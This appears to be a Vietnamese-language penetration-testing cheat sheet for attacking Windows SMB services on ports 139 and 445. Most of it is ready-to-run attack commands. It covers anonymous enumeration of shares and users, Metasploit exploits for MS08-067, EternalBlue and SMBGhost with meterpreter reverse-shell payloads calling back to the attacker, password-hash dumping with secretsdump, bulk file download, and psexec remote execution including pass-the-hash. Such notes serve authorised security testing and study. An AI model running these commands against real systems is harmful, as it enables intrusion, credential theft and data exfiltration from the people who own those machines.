# SMB (Port  139, 445)

## Connect

### Kết nối bằng smbclient

Liệt kê tất cả các chia sẻ (shares) có sẵn trên máy chủ SMB:

```
smbclient -L //<ip>
```

***

## Enumeration

### smbclient

Liệt kê các chia sẻ SMB với tài khoản ẩn danh hoặc Guest:

```
smbclient -N -L //<ip>/
```

### enum4linux

Liệt kê thông tin chi tiết:

```
enum4linux -u '<user>' -p '<password>' -a <ip>
```

### IPC$

Liệt kê người dùng nếu chia sẻ IPC$ cho phép truy cập ẩn danh:

```
impacket-lookupsid anonymous@<ip>
```

***

## Attack Vectors

### Đăng nhập ẩn danh

Kết nối ẩn danh hoặc Guest để thu thập thông tin hệ thống:

```
smbclient -L //<ip>/ -U anonymous/Guest
```

Sau khi kết nối, chạy các lệnh:

```bash
srvinfo
enumdomusers
getdompwinfo
```

### Khai thác MS08-067 (Netapi)

Khai thác lỗ hổng MS08-067 để thực thi mã từ xa qua SMB:

```
msf> use exploit/windows/smb/ms08_067_netapi
   > set RHOSTS <ip>
   > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   > set LHOST <your_ip>
   > exploit
```

### Khai thác MS17-010 (EternalBlue)

Khai thác lỗ hổng EternalBlue trên SMBv1 để thực thi mã từ xa:

```
msf> use exploit/windows/smb/ms17_010_eternalblue
   > set RHOSTS <ip>
   > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   > set LHOST <your_ip>
   > exploit
```

### Khai thác SMBGhost (CVE-2020-0796)

Khai thác lỗ hổng SMBv3 để thực thi mã từ xa:

```
msf> use exploit/windows/smb/cve_2020_0796_smbghost
   > set RHOSTS <ip>
   > set PAYLOAD windows/x64/meterpreter/reverse_tcp
   > set LHOST <your_ip>
   > exploit
```

***

## Post-Exploitation

### Kết nối tới SMB

Kết nối tới chia sẻ SMB cụ thể với thông tin đăng nhập:

```
smbclient \\\\<ip>\\<share_name> -U <user>
```

{% hint style="info" %}
\--option='client min protocol=NT1' với phiên củ cũ
{% endhint %}

### Các lệnh SMBclient thông dụng

<table><thead><tr><th width="172">Lệnh smbclient</th><th width="421">Giải thích</th></tr></thead><tbody><tr><td>ls</td><td>Liệt kê danh sách file và thư mục</td></tr><tr><td>cd &#x3C;folder></td><td>Di chuyển vào thư mục con</td></tr><tr><td>get &#x3C;file></td><td>Tải (download) một file</td></tr><tr><td>mget &#x3C;pattern></td><td>Tải nhiều file cùng lúc từ share SMB về máy local</td></tr><tr><td>put &#x3C;file></td><td>Upload một file </td></tr><tr><td>mput &#x3C;pattern></td><td>Upload nhiều file cùng lúc</td></tr><tr><td>lcd &#x3C;local_folder></td><td>Đổi thư mục làm việc hiện tại trên máy local</td></tr><tr><td>pwd</td><td>Hiển thị đường dẫn thư mục hiện tại</td></tr><tr><td>prompt</td><td>Bật/tắt chế độ hỏi xác nhận khi dùng lệnh mget/mput</td></tr><tr><td>help</td><td>Hiển thị danh sách các lệnh có thể sử dụng</td></tr><tr><td>exit/quit</td><td>Thoát khỏi phiên làm việc</td></tr></tbody></table>

### Dumping Hashes

Trích xuất hàm băm mật khẩu từ hệ thống:

```
impacket-secretsdump <domain>/<user>:<password>@<ip>
```

### Tải xuống nhiều tệp

Tải xuống đệ quy các tệp từ chia sẻ SMB với smbclient:

```
mask ""
RECURSE ON
PROMPT OFF
mget *
```

Tương tự tải tất cả các file với smbmap:

```
smbmap -R <share_name> -H <ip> -A <file> -q
smbmap -u <user> -p <pass> -H <ip> -s <share> -R -A '.*'
```

### Thực thi lệnh từ xa

Thực thi lệnh từ xa trên máy chủ SMB bằng psexec với thông tin đăng nhập:

```
impacket-psexec <domain>/<user>:<password>@<ip>
```

Ta cũng có thể sử dụng NTLM hash để xác thực:

{% code overflow="wrap" %}

```
impacket-psexec -hashes <hash> <domain>/<user>@<ip>
```

{% endcode %}